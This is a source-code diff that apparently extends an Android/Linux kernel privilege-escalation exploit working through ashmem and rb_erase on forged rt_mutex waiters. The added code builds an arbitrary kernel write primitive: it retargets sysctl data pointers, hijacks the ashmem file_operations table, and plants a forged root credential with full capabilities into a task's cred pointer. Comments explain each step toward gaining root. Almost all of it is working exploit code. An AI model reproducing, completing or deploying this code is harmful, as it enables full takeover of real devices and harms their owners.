@@ -160,6 +160,8 @@ uintptr_t slide_p0_offset;
 uintptr_t slide_oracle_parent;
 uintptr_t slide_oracle_target;
 uintptr_t slide_oracle_child;
+uintptr_t slide_oracle_page_base;
+uintptr_t slide_oracle_root_cred;
 uintptr_t p0_gate_page_struct;
 uintptr_t p0_probe_page_struct;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -246,6 +248,11 @@ int select_slide_payload_index(size_t index) {
     fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
                 index * SLIDE_BANK_SLOT_STRIDE;
     fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
+    /* A clean leaf-node page word for the arb-write value (page-aligned, so
+     * its rb_left/rb_right read as 0 -> rb_erase takes the survivable
+     * ONE-CHILD path).  Used as V when DIRECT_ERASE_WRITE has no explicit
+     * DIRECT_WRITE_VALUE. */
+    slide_oracle_page_base = slide_bank_payload_base;
 
     /* target = &ctl_table.data for the boot_id sysctl (KASLR-computable).
      * Leafless mode (default): the rb_erase writes 0 into parent's child
@@ -269,7 +276,78 @@ int select_slide_payload_index(size_t index) {
         q = (uintptr_t)v;
       }
     }
-    if (getenv("DIRECT_BOOTID_CHILD")) {
+    if (getenv("DIRECT_FOPS_OWNER_CLEAR")) {
+      fake_fops = slide_bank_payload_base + 0x1000;
+      fake_lock = slide_bank_payload_base + FOPS_WRITE_LOCK_OFF;
+      fake_w0 = fake_lock + 0x40;
+      q = fake_fops;
+      slide_oracle_parent = q - 8;
+      slide_oracle_child = 0;
+      slide_oracle_target = 0;
+    } else if (getenv("DIRECT_FOPS_PROBE")) {
+      fake_fops = slide_bank_payload_base + 0x1000;
+      fake_lock = slide_bank_payload_base + 0x1180;
+      fake_w0 = slide_bank_payload_base + 0x11c0;
+      slide_oracle_target = SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR +
+                            slide_p0_offset;
+      slide_oracle_parent = slide_oracle_target - 0x10;
+      slide_oracle_child = slide_bank_payload_base + FOPS_RECLAIM_PROBE_OFF;
+    } else if (getenv("DIRECT_FOPS_WRITE")) {
+      q = kaslr_image_addr(ASHMEM_MISC_FOPS);
+      fake_fops = slide_bank_payload_base + 0x1000;
+      fake_lock = slide_bank_payload_base + FOPS_WRITE_LOCK_OFF;
+      fake_w0 = fake_lock + 0x40;
+      slide_oracle_parent = q - 8;
+      slide_oracle_child = 0;
+      slide_oracle_target = fake_fops;
+    } else if (getenv("DIRECT_ERASE_WRITE")) {
+      /* General arb-write: B = DIRECT_BOOTID_ADDR (the write TARGET VA),
+       * V = DIRECT_WRITE_VALUE (the value to plant).  The waiter's
+       * tree_parent_color = B-8 (its rb_left aliases B) and tree_left = V,
+       * so rb_erase's one-child `str child,[parent_child_slot]` writes V
+       * into B.  B must be a WRITABLE kernel VA (a writable sysctl's
+       * ctl_table.data).  V must point to a clean leaf rb_node (rb_left/
+       * rb_right read as 0) so rb_erase takes the survivable ONE-CHILD
+       * path; the reclaimed page base is page-aligned and zeroed there,
+       * so it is the safe default.  After retargeting that sysctl to a
+       * known address, writing the sysctl yields a full arbitrary write. */
+      slide_oracle_parent = q - 8;
+      slide_oracle_child = 0;
+      slide_oracle_target = slide_oracle_page_base;
+      const char *val_arg = getenv("DIRECT_WRITE_VALUE");
+      if (val_arg && *val_arg) {
+        char *vend = NULL;
+        errno = 0;
+        unsigned long long vv = strtoull(val_arg, &vend, 0);
+        if (!errno && vend != val_arg && !*vend && !(vv & 7)) {
+          slide_oracle_target = (uintptr_t)vv;
+        }
+      }
+      /* CRED-PRELOAD: lay a root cred (uid=0, full caps) in the reclaimed
+       * page at SLIDE_BANK_LOCK_OFF-0x200 and aim the arb-write value at it.
+       * With DIRECT_BOOTID_ADDR = init_task.cred's ctl-redirect address the
+       * erase plants &page_root_cred into init_task.cred, making swapper
+       * root; combined with a writable-sysctl redirect this same primitive
+       * writes any 8 bytes anywhere.  The cred image is written into the
+       * payload page by prepare_skb_payload via slide_credit_page_root. */
+      if (getenv("DIRECT_CRED_PRELOAD")) {
+        /* Root cred image lives at page+0x200 (clean: page+0..0xFFF is
+         * memset 0 for SLIDE, well before the task/lock banks at
+         * 0x1000/0x5200).  Aim the arb-write value at it. */
+        slide_oracle_root_cred = slide_oracle_page_base + 0x200;
+        slide_oracle_target = slide_oracle_root_cred;
+      }
+    } else if (getenv("DIRECT_ERASE_VALUE")) {
+      /* General arb-write steering: parent = DIRECT_BOOTID_ADDR = B (the
+       * write TARGET), tree_left stays target (value the walk writes).
+       * rb_erase's one-child path does `str child,[parent_child_slot]`;
+       * with parent=B-? the written word lands at B.  The value written is
+       * the waiter's own rb linkage -> target = &ctl_table.data (known).
+       * Used to retarget a WRITABLE sysctl's ctl_table.data to a known
+       * address, after which that sysctl yields a full arb-write. */
+      slide_oracle_parent = q;
+      slide_oracle_child = 0;
+    } else if (getenv("DIRECT_BOOTID_CHILD")) {
       /* parent = ctl_table.data - 0x10 -> parent->rb_left == &ctl_table.data.
        * Waiter must be parent's LEFT child and have one child = Q. */
       slide_oracle_parent = slide_oracle_target - 0x10;
@@ -585,7 +663,19 @@ void init_ashmem_path(void) {
 }
 
 int open_ashmem_device(void) {
-  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
+  int fd = -1;
+  if (ashmem_path[0]) {
+    fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
+    if (fd >= 0) {
+      return fd;
+    }
+    pr_warning("ashmem open %s errno=%d\n", ashmem_path, errno);
+  }
+  fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
+  if (fd < 0) {
+    pr_warning("ashmem open /dev/ashmem errno=%d\n", errno);
+  }
+  return fd;
 }
 
 uintptr_t p0_data_alias(uintptr_t image_addr) {
@@ -599,7 +689,11 @@ uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+#if defined(P0_DATA_NO_SLIDE) && P0_DATA_NO_SLIDE
+  /* Kernel .data lives at the slid kimage VA. The linear-map alias
+   * p0+off is a different physical page; p0+slide is unmapped (RWC:83). */
+  return kaslr_image_addr(image_addr);
+#elif defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   uintptr_t address = p0_data_alias(image_addr);
   return data_alias_uses_slide ? address + slide_p0_offset : address;
 #else
@@ -635,9 +729,12 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 }
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
+  /* owner/llseek/read occupy the first three qwords.  rb_erase treats V
+   * as an rb_node, so llseek (rb_right) and read (rb_left) must stay 0
+   * or the two-child successor path panics.  CFI uses read_iter first;
+   * repair_fake_fops_llseek fills noop_llseek after the hijack lands. */
   put64(p, off + FOPS_OWNER_OFF, 0);
-  put64(p, off + FOPS_LLSEEK_OFF,
-        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+  put64(p, off + FOPS_LLSEEK_OFF, 0);
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
@@ -978,6 +1075,24 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
         put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
       }
+      /* CRED-PRELOAD: lay a root cred image at p+0x200 (page+0x200, in the
+       * zeroed SLIDE page head, clear of the task/lock banks at
+       * 0x1000/0x5200).  The arb-write value (slide_oracle_target) is aimed
+       * at page+0x200 by select_slide_payload_index under
+       * DIRECT_CRED_PRELOAD, so the erase plants &this cred into the chosen
+       * task's task_struct.cred pointer. */
+      if (getenv("DIRECT_CRED_PRELOAD")) {
+        static const unsigned char root_cred_img[0x48] = {
+          0x04, 0x00, 0x00, 0x00, /* usage = 4 */
+          0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, /* uid..sgid = 0 */
+          0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, /* euid.. */
+          0, 0, 0, 0, 0, 0, 0, 0,
+          0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, /* cap_inh */
+          0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, /* cap_perm */
+          0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00, /* cap_eff */
+        };
+        memcpy(p + 0x200, root_cred_img, sizeof(root_cred_img));
+      }
     }
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
     return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
@@ -1064,9 +1179,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   }
 #endif
 
-  uintptr_t write_pc = fake_fops;
-  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
-  uintptr_t write_left = 0;
+  uintptr_t write_pc = data_addr(ASHMEM_MISC_FOPS) - 8;
+  uintptr_t write_right = 0;
+  uintptr_t write_left = fake_fops;
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
@@ -1130,7 +1245,32 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, LEFT_OFF + 0x10, 0);
 
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      put_fake_fops_table(p, FOPS_TABLE_OFF);
+      put_fake_fops_table(p, 0x1000);
+      put32(p, 0x1180, 0);
+      put64(p, 0x1188, payload_base + 0x11c0);
+      put64(p, 0x1190, payload_base + 0x11c0);
+      put64(p, 0x1198, SLIDE_LOCK_OWNER_VALUE);
+      put_fake_waiter(p, 0x11c0,
+                      data_addr(ASHMEM_MISC_FOPS) - 8, 0,
+                      payload_base + 0x1000,
+                      data_addr(ASHMEM_MISC_FOPS) - 8, 0,
+                      payload_base + 0x1000,
+                      text_addr(INIT_TASK), payload_base + 0x1180,
+                      SLIDE_FAKE_WAITER_PRIO);
+      put32(p, FOPS_WRITE_LOCK_OFF, 0);
+      put64(p, FOPS_WRITE_LOCK_OFF + 8, payload_base + FOPS_WRITE_LOCK_OFF + 0x40);
+      put64(p, FOPS_WRITE_LOCK_OFF + 16, payload_base + FOPS_WRITE_LOCK_OFF + 0x40);
+      put64(p, FOPS_WRITE_LOCK_OFF + 24, SLIDE_LOCK_OWNER_VALUE);
+      put_fake_waiter(p, FOPS_WRITE_LOCK_OFF + 0x40,
+                      data_addr(ASHMEM_MISC_FOPS) - 8, 0,
+                      payload_base + 0x1000,
+                      data_addr(ASHMEM_MISC_FOPS) - 8, 0,
+                      payload_base + 0x1000,
+                      text_addr(INIT_TASK), payload_base + FOPS_WRITE_LOCK_OFF,
+                      SLIDE_FAKE_WAITER_PRIO);
+      put64(p, FOPS_RECLAIM_PROBE_OFF, FOPS_RECLAIM_PROBE_MAGIC);
+      put64(p, FOPS_RECLAIM_PROBE_OFF + 8, 0);
+      put64(p, FOPS_RECLAIM_PROBE_OFF + 16, 0);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(APP_FOPS_TABLE_MIRROR_OFF)
       /*
